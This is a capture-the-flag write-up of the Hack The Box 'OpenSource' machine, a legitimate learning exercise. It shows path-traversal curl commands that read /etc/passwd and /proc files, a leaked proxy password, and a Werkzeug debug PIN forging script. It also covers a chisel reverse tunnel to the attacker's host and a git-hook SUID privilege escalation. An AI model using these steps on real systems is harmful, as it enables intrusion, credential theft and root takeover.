---
author: Supaaasuge
title: OpenSource - HTB Writeup 
date: 2024-05-04
Lastmod: 2024-05-04
description: "Writeup for the Hack The Box room OpenSource"
categories:
  - Hack The Box
tags:
  - Flask
---

# OpenSource - HTB Writeup
**Difficulty: Medium**
## Enumeration
Starting off, I ran a full port scan to find open ports:
```bash
nmap -p- --min-rate 10000 -Pn $IP -oG p-.scan
...
$ cat p-.scan
Host: 10.129.227.140 ()	Status: Up
Host: 10.129.227.140 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Mon May  6 17:30:07 2024 -- 1 IP address (1 host up) scanned in 81.90 seconds
```
Ports: `22`, `80`. Moving on to a TCP + service version scan with operating system detection:
```bash
nmap -p22,80 -O -sCVT -Pn $IP
cat scvto.scan 
# Nmap 7.94SVN scan initiated Mon May  6 17:32:59 2024 as: nmap -p22,80 -sCVT -O -Pn -oN scvto.scan 10.129.227.140
Nmap scan report for 10.129.227.140
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.10.3
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 06 May 2024 21:33:07 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 06 May 2024 21:33:07 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: upcloud - Upload files for Free!
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=5/6%Time=66394C93%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1573,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x2
SF:0Python/3\.10\.3\r\nDate:\x20Mon,\x2006\x20May\x202024\x2021:33:07\x20G
SF:MT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x
SF:205316\r\nConnection:\x20close\r\n\r\n<html\x20lang=\"en\">\n<head>\n\x
SF:20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20nam
SF:e=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\"
SF:>\n\x20\x20\x20\x20<title>upcloud\x20-\x20Upload\x20files\x20for\x20Fre
SF:e!</title>\n\n\x20\x20\x20\x20<script\x20src=\"/static/vendor/jquery/jq
SF:uery-3\.4\.1\.min\.js\"></script>\n\x20\x20\x20\x20<script\x20src=\"/st
SF:atic/vendor/popper/popper\.min\.js\"></script>\n\n\x20\x20\x20\x20<scri
SF:pt\x20src=\"/static/vendor/bootstrap/js/bootstrap\.min\.js\"></script>\
SF:n\x20\x20\x20\x20<script\x20src=\"/static/js/ie10-viewport-bug-workarou
SF:nd\.js\"></script>\n\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hr
SF:ef=\"/static/vendor/bootstrap/css/bootstrap\.css\"/>\n\x20\x20\x20\x20<
SF:link\x20rel=\"stylesheet\"\x20href=\"\x20/static/vendor/bootstrap/css/b
SF:ootstrap-grid\.css\"/>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20
SF:href=\"\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\"/>\n\n\x
SF:20\x20\x20\x20<link\x20rel=")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\
SF:r\nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Mon,\x200
SF:6\x20May\x202024\x2021:33:07\x20GMT\r\nContent-Type:\x20text/html;\x20c
SF:harset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x20GET\r\nContent-Length:\x
SF:200\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4,"<!DOCTYPE\x20H
SF:TML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n
SF:\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-e
SF:quiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\
SF:x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1
SF:>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20co
SF:de:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20r
SF:equest\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x
SF:20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x
SF:20\x20\x20</body>\n</html>\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May  6 17:35:05 2024 -- 1 IP address (1 host up) scanned in 125.59 seconds
```
From this, we can see that it's a Ubuntu Bionic 18.04 host based off of the SSH version, running a flask site (`Wekzeug/2.1.2 Python/3.10.3`) on port 80.

Moving on to the website on port 80.... It's a basic site for `upcloud`, where you ca upload files for storage. The only other endpoint is `/upcloud`, where you can upload files file storage. When uploading a file, it will simply upload it to the `/upload` folder. 

You are also able to download the site's source code... So I went ahead and downloaded that and unzipped it. While it was downloading, we finally got a result from running `gobuster`:
```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.227.140/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 123 / 220561 (0.06%)[ERROR] context deadline exceeded (Client.Timeout or context cancellation while reading body)
/console              (Status: 200) [Size: 1563]
Progress: 10082 / 220561 (4.57%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 10085 / 220561 (4.57%)
===============================================================
Finished
===============================================================
```

This endpoint gives us access to the Flask debug console, I will leave this for now although if I had to guess, this is likely our means of getting a foothold because the Flask debug console allows the ability to run system commands from it's console.

Now going through the contents downloaded... 

![alt text](/posts/opensource-htb-1.png)

We can easily see that this is a git repository. Checking the logs:
```bash
git log --oneline

Make sure to clean up the dockerfile for production use.
```
This tells us that there is likely sensitive information disclosure somewhere. 

Checking all the branches from the repo:
```bash
git branch -a
```
### Vulnerability
In `views.py`. There is a function for handling uploads and serving them to the user called `send_report`:
```python
@app.route('/uploads/<path:path>')
def send_report(path):
  path = get_file_name(path)
  return send_file(os.path.join(os.getcwd(), 'public', 'uploads', path))
```
This function allows for path traversal. To showcase how this works I'll start a standard python interpreter:
```bash
~ 
❯ python -q
>>> import os
>>> path = "supaaasuge"
>>> vuln_path = "/spaaasuge"
>>> os.path.join(os.getcwd(), 'public', path)
'/home/supaaa/public/supaaasuge'
>>> os.path.join(os.getcwd(), 'public', vuln_path)
'/spaaasuge'
>>> 

```
This is a bit unexpected however here is the docoumentation that goes over this in more detail: [Docs](https://docs.python.org/3.10/library/os.path.html#os.path.join)

As you can see, by prepending the filename with `/` this then becomes the absolute path. 

To exploit this I tried sending: 
```bash
curl --path-as-is http://10.129.227.140/uploads//etc/passwd
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://10.129.227.140/uploads/etc/passwd">http://10.129.227.140/uploads/etc/passwd</a>. If not, click the link.
```
This does not work... odd. After trying some different stuff, I found that to make this work you have to send `../` prepended to the path name. I am not exactly sure why this is honestly, but it works so I'm not gonna lose any sleep over it know what I'm sayin?
```bash
curl --path-as-is http://10.129.227.140/uploads/..//etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```
Users with a shell: ``halt`, `root`
Success! I first tried to see if I was able to grab any SSH keys but no luck... But since I have local file inclusion, I can instead use this to gather the information needed to brute force the Flask Debug console PIN number and get a shell that way as specified [here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#werkzeug-console-pin-exploit). Or, we could simply overwrite `views.py` to execute a reverse shell by capturing the upload using burpsuite then modifying the code.

To brute force the flask PIN:

We need to grab: `username`, `modname(flask.app)`, `/proc/net/arp(Device ID to extract MAC address)`, as well as `/proc/self/cgroup`.

we know the username from the git diff:
```bash
git diff a76f8f7 ee9d9f1
diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
deleted file mode 100644
index 5975e3f..0000000
--- a/app/.vscode/settings.json
+++ /dev/null
@@ -1,5 +0,0 @@
-{
-  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
-  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
-  "http.proxyStrictSSL": false
-}
diff --git a/app/app/views.py b/app/app/views.py
index 0f3cc37..f2744c6 100644
--- a/app/app/views.py
+++ b/app/app/views.py
@@ -6,17 +6,7 @@ from flask import render_template, request, send_file
 from app import app
 
 
-@app.route('/')
-def index():
-    return render_template('index.html')

```

Now, retrieving `/proc/net/arp`:
```bash
curl --path-as-is http://10.129.227.140/uploads/..//proc/net/arp --ignore-content-length
IP address       HW type     Flags       HW address            Mask     Device
172.17.0.1       0x1         0x2         02:42:d0:f3:4e:a7     *        eth0
```
Active interface `eth0`, using this to grab the MAC address from `/sys/class/net/eth0/address`:
```bash
curl --path-as-is http://10.129.227.140/uploads/..//sys/class/net/eth0/address --ignore-content-length
02:42:ac:11:00:02
python -q
>>> 0x0242ac110002
2485377892354
>>>
```

Next, grabbing `/proc/sys/kernel/random/boot_id` and `/proc/self/cgroup`

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/OpenSource/src]
└─$ curl --path-as-is http://10.129.227.140/uploads/..//proc/sys/kernel/random/boot_id --ignore-content-length
49f8507d-f27f-4ab3-8797-b1d1cf318111

┌──(kali㉿kali)-[~/Desktop/HTB/OpenSource/src]
└─$ curl --path-as-is http://10.129.227.140/uploads/..//proc/self/cgroup --ignore-content-length
12:blkio:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
11:hugetlb:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
10:cpu,cpuacct:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
9:net_cls,net_prio:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
8:freezer:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
7:memory:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
6:devices:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
5:cpuset:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
4:rdma:/
3:perf_event:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
2:pids:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
1:name=systemd:/docker/6d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c
0::/system.slice/snap.docker.dockerd.service
```
Final script to get the PIN:
```python
import hashlib
from itertools import chain
probably_public_bits = [
    'root',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '2485377892354',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    '49f8507d-f27f-4ab3-8797-b1d1cf3181116d6f391adb0dd94d35dd08d88f0607c01710f8399287ac7fcce475aa812c082c'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```
PIN recovered: `921-105-725` after entering this into the console PIN popup, we get access to the debug console shell and we can use this to get a reverse shell!

Once we get a shell and run `ifconfig eth0` we can see that it's a docker container due to the address's format: `172.17.x.x`. Remember from the port scan we found port `3000` open but it was filtered. Running a quick wget on the 'host' of the docker container `172.17.0.1:3000` retrieves a gitea instance. Let's download `chisel` onto the host and start a reverse proxy so that we can access the gitea instance.

On local machine:
```bash
chisel server -p 1234 --reverse
```

On the remote machine after downloading chisel from your local machine:
```bash
chisel client 10.10.16.214:1234 R:3000:172.17.0.1:3000
```

Now after we get a connection back, I logged into the instance using  the username/password I found from running `git diff`. After logging in, there is a repo called `home-backup` which contains `.ssh`. From here, we can grab the private SSH key, then use this to SSH into the machine as the `dev01` user.

### root
After doing a bit of enumeration, I eventually downloaded `pspy64` from my local machine to check the running processes. After running this, we can see there is a git commit that is ran on a schedule. [This](https://www.atlassian.com/git/tutorials/git-hooks) post shows how we can utilize git hooks to get code execution.

I will simply apply suid permissions to `/bin/bash` using the following:
```bash
echo 'chmod 4755 /bin/bash' > ~/.git/hooks/pre-commit
chmod +x ~/.git/hooks/pre-commit
```
After running above... after a few seconds the script will run and we can get root by running:
```bash
/bin/bash -p #dont drop privileges from owner
```

Annnnddd that about does it for that machine! Thanks for reading.